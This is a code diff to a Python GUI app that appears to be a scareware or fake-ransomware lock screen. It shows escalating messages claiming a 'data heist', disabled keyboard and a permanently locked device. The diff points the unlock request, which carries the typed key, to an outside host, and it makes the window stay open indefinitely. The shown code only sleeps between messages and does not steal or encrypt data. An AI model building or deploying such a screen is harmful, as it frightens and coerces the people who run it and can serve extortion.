@@ -78,7 +78,7 @@ class App(customtkinter.CTk):
             try:
                 key = self.input_box.get()
                 print(f"CLIENT ATTEMPTING UNLOCK WITH KEY: {key}")
-                requests.post("http://localhost:5000/unlock", data={"key": key})
+                requests.post("http://robottik.co.uk/unlock", data={"key": key})
             except Exception as e:
                 print(f"FAILED TO UNLOCK: {e}")
         threading.Thread(target=unlock_thread, args=(self,)).start()
@@ -106,30 +106,31 @@ class App(customtkinter.CTk):
 
         def data_thread(self):
             print("BEGINNING DATA HEIST")
-            self.status.configure(text="STATUS: BEGINNING DATA HEIST...")
-            time.sleep(2)
-            self.status.configure(text="STATUS: ITERATING ROOT DIRECTORY...")
-            time.sleep(random.randint(3,5))
-            self.status.configure(text="STATUS: CLONING REGISTRY EDITOR DATA...")
-            time.sleep(random.randint(3,5))
-            self.status.configure(text="HINT: PULLING THE PLUG MIGHT BE A GOOD IDEA...")
-            time.sleep(random.randint(3,5))
-            self.status.configure(text="HINT: KEYBOARD NOT WORKING??")
-            time.sleep(random.randint(3,5))
-            self.status.configure(text="HINT: DISCONNECTING INTERNET IS NOT A GOOD IDEA...")
-            time.sleep(random.randint(3,5))
-            self.status.configure(text="COMPLETE")
-            self.loading_bar.stop()
-            time.sleep(random.randint(3,5))
-            self.status.configure(text="DATA ENCRYPTED AND EXPORTED")
-            time.sleep(random.randint(3,5))
-            self.status.configure(text="DEVICE PERMANENTLY LOCKED - ENJOY")
-            time.sleep(20)
-            self.running = False
             try:
-                self.destroy()
-            except:
-                pass
+                self.status.configure(text="STATUS: BEGINNING DATA HEIST...")
+                time.sleep(2)
+                self.status.configure(text="STATUS: ITERATING ROOT DIRECTORY...")
+                time.sleep(random.randint(3,5))
+                self.status.configure(text="STATUS: CLONING REGISTRY EDITOR DATA...")
+                time.sleep(random.randint(3,5))
+                self.status.configure(text="HINT: PULLING THE PLUG MIGHT BE A GOOD IDEA...")
+                time.sleep(random.randint(3,5))
+                self.status.configure(text="HINT: KEYBOARD NOT WORKING??")
+                time.sleep(random.randint(3,5))
+                self.status.configure(text="HINT: DISCONNECTING INTERNET IS NOT A GOOD IDEA...")
+                time.sleep(random.randint(3,5))
+                self.status.configure(text="COMPLETE")
+                self.loading_bar.stop()
+                time.sleep(random.randint(3,5))
+                self.status.configure(text="DATA ENCRYPTED AND EXPORTED")
+                time.sleep(random.randint(3,5))
+                self.status.configure(text="DEVICE PERMANENTLY LOCKED - ENJOY")
+            except Exception as error:
+                print(error)
+            while self.running:
+                time.sleep(30)
+                
+                
 
 
 
